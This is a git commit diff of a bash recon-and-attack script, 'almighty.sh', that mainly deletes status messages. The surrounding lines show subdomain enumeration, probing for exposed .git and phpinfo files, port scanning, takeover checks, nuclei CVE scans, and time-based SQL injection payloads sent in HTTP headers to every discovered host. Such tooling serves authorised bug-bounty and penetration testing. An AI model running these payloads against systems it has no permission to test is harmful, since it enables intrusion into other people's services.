52a1756e2f85cb7aab4851131c194875f6415ce2
Dhane Ashley Diabajo <dhaneashleyd@gmail.com>
2024-10-27 06:05:54 +0800

    Update almighty.sh

--- almighty.sh
+++ almighty.sh
@@ -11,7 +11,6 @@ echo -e """${CYAN}
 ░█▀▀█ █░░ █▀▄▀█ ░▀░ █▀▀▀ █░░█ ▀▀█▀▀ █░░█ 
 ▒█▄▄█ █░░ █░▀░█ ▀█▀ █░▀█ █▀▀█ ░░█░░ █▄▄█ 
 ▒█░▒█ ▀▀▀ ▀░░░▀ ▀▀▀ ▀▀▀▀ ▀░░▀ ░░▀░░ ▄▄▄█${RESET}"""
-
 echo -e "${GREEN}By Dhane Ashley Diabajo${RESET}"
 echo ""
 usage() {
@@ -32,50 +31,49 @@ fi
 
 echo -e "${GREEN}Creating Subdomain Directory${RESET}"
 mkdir -p Subdomains
-echo -e "${CYAN}Complete${RESET}"
+
 
 echo -e "${GREEN}Running Subfinder, Anew, and Httpx...${RESET}"
 echo ${TARGET_DOMAIN} | subfinder -recursive -active -silent | anew | httpx -silent >> Subdomains/subdomains.txt
-echo -e "${CYAN}Complete${RESET}"
 
 echo -e "${GREEN}Running Httpx Scanning for sensitive files...${RESET}"
 cat Subdomains/subdomains.txt | httpx -silent -path "/server-status" -mc 200 -title > Subdomains/httpx-Server-status.txt
 cat Subdomains/subdomains.txt | httpx -silent -path "/phpinfo.php" -mc 200 -title > Subdomains/httpx-phpinfo.txt
 cat Subdomains/subdomains.txt | httpx -silent -path "/.DS_Store" -mc 200 -title > Subdomains/httpx-DS_store.txt
 cat Subdomains/subdomains.txt | httpx -silent -path "/.git" -mc 200 -title > Subdomains/httpx-git.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Running Httpx...${RESET}"
 cat Subdomains/subdomains.txt | httpx -silent -sc -title -cl --tech-detect >> Subdomains/httpx-details.txt
-echo -e "${CYAN}Complete${RESET}"
+
 
 echo -e "${GREEN}Running Naabu...${RESET}"
 cat Subdomains/subdomains.txt | naabu -v --passive -silent > Subdomains/ports.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Running Subzy and checking for subdomain takeovers...${RESET}"
 subzy run --targets Subdomains/subdomains.txt >> Subdomains/subzy.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Running SQLi attack using X-Forwarded-For...${RESET}"
 cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwarded-For:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-X-Forwarded-For.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Running SQLi attack using X-Forwarded-Host...${RESET}"
 cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwarded-Host:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-X-Forwarded-Host.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Running SQLi attack using User-Agent...${RESET}"
 cat Subdomains/subdomains.txt | httpx -silent -H "User-Agent:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-User-Agent.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Creating nuclei directory...${RESET}"
 mkdir -p Subdomains/nuclei
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Running Nuclei for possible subdomain takeovers...${RESET}"
 cat Subdomains/subdomains.txt | nuclei -silent -t /$HOME/nuclei-templates/http/takeovers/*.yaml > Subdomains/nuclei/nuclei-subover.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 for year in {2000..2024}; do
     echo -e "${GREEN}Running Nuclei template for year $year...${RESET}"
@@ -100,7 +98,7 @@ echo -e "${GREEN}Task finished${RESET}"
 
 echo -e "${GREEN}Combining all URLs${RESET}"
 cat urls/katana.txt urls/gau.txt urls/waybackurls.txt > urls/final-clean.txt
-echo -e "${GREEN}Task Completed${RESET}"
+
 
 echo -e "${GREEN}Checking all js files and running linkfinder...${RESET}"
 mkdir -p js-files
@@ -118,7 +116,7 @@ cat urls/final-clean.txt | grep "\.js$" | while read -r url; do
         } >> js-files/endpoints.txt
     fi
 done
-echo -e "${GREEN}Task Completed${RESET}"
+
 
 
 echo -e "${GREEN}Checking for possible XSS vulnerabilities...${RESET}"
@@ -143,7 +141,7 @@ cat urls/final-clean.txt | gf ssti > urls/ssti.txt
 
 mkdir urls/nuclei
 for i in {2000..2024}; do
-    echo -e "${NUCLEI_COLOR}Running Nuclei template $i${RESET}"
+    echo -e "${GREEN}Running Nuclei template $i...${RESET}"
     cat urls/final-clean.txt | nuclei -silent -rate-limit 200 -t /$HOME/nuclei-templates/http/cves/$i/*.yaml > urls/nuclei/nuclei-$i.txt
 done
 echo -e "${GREEN}Process complete!${RESET}"
